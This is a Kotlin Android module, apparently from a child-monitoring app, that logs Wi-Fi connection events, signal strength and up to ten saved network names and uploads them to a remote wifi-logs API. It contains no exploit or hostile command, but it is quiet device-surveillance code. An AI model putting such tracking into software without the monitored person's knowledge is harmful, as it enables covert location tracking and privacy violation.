package com.example.kidsguardchild.modules

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.NetworkInfo
import android.net.wifi.WifiManager
import android.util.Log
import com.example.kidsguardchild.core.ApiClient
import com.example.kidsguardchild.core.DataUploader
import com.example.kidsguardchild.core.WifiLogBody
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

private const val TAG = "WifiModule"

/**
 * Monitors Wi-Fi connect/disconnect events via BroadcastReceiver.
 * Logs SSID name and signal quality to /api/wifi-logs on each state change.
 * Requires ACCESS_WIFI_STATE (auto-granted).
 */
class WifiModule(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO)

    /** Static inner class receiver registered in AndroidManifest */
    class WifiReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
                ?: return

            @Suppress("DEPRECATION")
            val networkInfo = intent.getParcelableExtra<NetworkInfo>(WifiManager.EXTRA_NETWORK_INFO)
            val state = networkInfo?.state

            val ssid = wifiManager.connectionInfo.ssid?.removeSurrounding("\"") ?: "Unknown"
            val rssi = wifiManager.connectionInfo.rssi
            val signal = when {
                rssi >= -55 -> "Strong"
                rssi >= -70 -> "Medium"
                else -> "Weak"
            }
            val status = when (state) {
                NetworkInfo.State.CONNECTED -> "Connected"
                NetworkInfo.State.DISCONNECTED -> "Disconnected"
                else -> state?.name ?: "Unknown"
            }

            Log.d(TAG, "Wi-Fi event: $ssid [$status] signal=$signal")

            CoroutineScope(Dispatchers.IO).launch {
                DataUploader.upload("WifiLog[$ssid]") {
                    ApiClient.service.postWifiLog(
                        WifiLogBody(ssid = ssid, status = status, signal = signal)
                    )
                }
            }
        }
    }

    fun start() {
        CoroutineScope(Dispatchers.IO).launch { logCurrentNetworks() }
        Log.d(TAG, "WifiModule active (manifest-registered receiver)")
    }

    suspend fun logCurrentNetworks() {
        val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            ?: return
        @Suppress("DEPRECATION")
        val info = wifiManager.connectionInfo ?: return
        val ssid = info.ssid?.removeSurrounding("\"") ?: "Unknown"
        val rssi = info.rssi
        val signal = when {
            rssi >= -55 -> "Strong"
            rssi >= -70 -> "Medium"
            else -> "Weak"
        }
        val status = if (wifiManager.isWifiEnabled) "Connected" else "Disconnected"
        DataUploader.upload("WifiCurrent") {
            ApiClient.service.postWifiLog(WifiLogBody(ssid = ssid, status = status, signal = signal))
        }
        @Suppress("DEPRECATION")
        val configs = wifiManager.configuredNetworks ?: emptyList()
        configs.take(10).forEach { config ->
            val name = config.SSID?.removeSurrounding("\"") ?: return@forEach
            DataUploader.upload("WifiSaved") {
                ApiClient.service.postWifiLog(
                    WifiLogBody(ssid = name, status = "Saved network", signal = "—")
                )
            }
        }
        Log.i(TAG, "Wi-Fi snapshot uploaded")
    }

    fun stop() {
        Log.d(TAG, "WifiModule stopped")
    }
}
